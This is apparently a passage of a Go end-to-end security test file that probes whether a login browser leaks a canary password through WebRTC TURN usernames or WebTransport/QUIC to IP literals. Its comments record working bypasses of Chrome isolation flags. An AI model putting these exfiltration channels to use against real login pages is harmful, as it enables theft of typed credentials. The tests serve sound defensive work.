// the page read from the DOM (the typed password). Nothing may reach the
// sinks.
//
// FINDING: HIGH (cat 3, browser isolation; bypass of ADR 0008 A11).
// --force-webrtc-ip-handling-policy=disable_non_proxied_udp does not stop
// ICE gathering over UDP on Chrome for Testing 156 with --no-proxy-server:
// STUN binding requests and TURN Allocate requests reach any IP and UDP
// port the page names, and after the server's 401 the retried Allocate
// carries the page-chosen USERNAME (observed: 6 of 13 datagrams carried
// the canary; also reproduced with both sinks on a non-loopback local
// address, 172.17.0.1, by a one-off local edit). TURN over TCP is blocked. A login page, or a script injected in it, can send what it
// reads from the DOM (the credential facto just typed) to an arbitrary
// host, outside Fetch and the resolver rules. Reproduce: make chrome, then
//
//	FACTO_E2E_CHROME=$(pwd)/.cache/chrome/<version>/chrome-linux64/chrome \
//	  go test -tags e2e,chrome -count=1 -run TestAttack_ChromeWebRTCToIPLiteral -v ./internal/browser/
//
// Fix direction (implementer, test-first): a WebRTC setting under which
// RTCPeerConnection reaches no network at all in the login browser, then
// keep this test as the proof.
func TestAttack_ChromeWebRTCToIPLiteral(t *testing.T) {
	t.Parallel()
	ctx, cancel := context.WithTimeout(t.Context(), 2*e2eTimeout)
	defer cancel()
	s := newAtkSite(t)
	r := atkRig(t, s)
	b := atkLaunch(ctx, t, r)
	exfil := testsecrets.Canary(t, testsecrets.Password)
	if err := atkOpen(ctx, t, b, "/rtc?u="+url.QueryEscape(exfil), "#done"); err != nil {
		t.Fatalf("rtc page did not settle: %v", err)
	}
	tcp, stun, _ := s.sinks()
	s.mu.Lock()
	turnPkts := s.turnPkts
	carried := 0
	for _, u := range s.turnUser {
		if strings.Contains(u, exfil) {
			carried++
		}
	}
	s.mu.Unlock()
	if tcp != 0 {
		t.Errorf("WebRTC TURN over TCP reached 127.0.0.1 by IP literal (%d connections)", tcp)
	}
	if stun != 0 {
		t.Errorf("FINDING: %d STUN binding requests reached 127.0.0.1 by IP literal", stun)
	}
	if turnPkts != 0 {
		t.Errorf("FINDING: %d TURN-over-UDP datagrams reached 127.0.0.1 by IP literal; %d Allocate requests carried the page-chosen USERNAME (the canary)", turnPkts, carried)
	}
}

// TestAttack_ChromeWebTransportToIPLiteral: a login page opens a
// WebTransport session (HTTP/3 over QUIC, UDP) to an IP literal with a
// pinned certificate hash. Nothing may leave the browser.
//
// FINDING: HIGH (cat 3/5). WebTransport is neither paused by Fetch (it is
// not an HTTP request the Fetch domain sees) nor stopped by
// --host-resolver-rules (an IP literal is never resolved), and
// --force-webrtc-ip-handling-policy only covers WebRTC. The QUIC packets
// reach any IP and UDP port the page names: a supplier page, or anything
// injected into it, can open a channel to an arbitrary server
// (serverCertificateHashes lets it use a self-signed certificate) and send
// whatever the page can read, outside the in-browser allowlist (ADR 0008
// A11). Reproduce: make chrome, then
//
//	FACTO_E2E_CHROME=$(pwd)/.cache/chrome/<version>/chrome-linux64/chrome \
//	  go test -tags e2e,chrome -count=1 -run TestAttack_ChromeWebTransportToIPLiteral -v ./internal/browser/
//
// Fix direction (implementer, test-first): block QUIC/WebTransport in the
// browser (for example --disable-quic plus a WebTransport kill switch or
// a policy), and keep this test as the proof.
func TestAttack_ChromeWebTransportToIPLiteral(t *testing.T) {
	t.Parallel()
	ctx, cancel := context.WithTimeout(t.Context(), 2*e2eTimeout)
	defer cancel()
	s := newAtkSite(t)
	r := atkRig(t, s)
	b := atkLaunch(ctx, t, r)
	if err := atkOpen(ctx, t, b, "/wt", "#done"); err != nil {
		t.Fatalf("webtransport page did not settle: %v", err)
	}
	cctx, ccancel := context.WithTimeout(ctx, 2*time.Second)
	opened := b.WaitVisible(cctx, "#done.wt-open") == nil
	ccancel()
	if _, _, wt := s.sinks(); wt != 0 {
		t.Errorf("FINDING: %d WebTransport/QUIC datagrams reached 127.0.0.1 by IP literal: a channel outside Fetch and the resolver rules", wt)
	}
	if opened {
		t.Error("WebTransport session to an IP literal opened")
	}
}
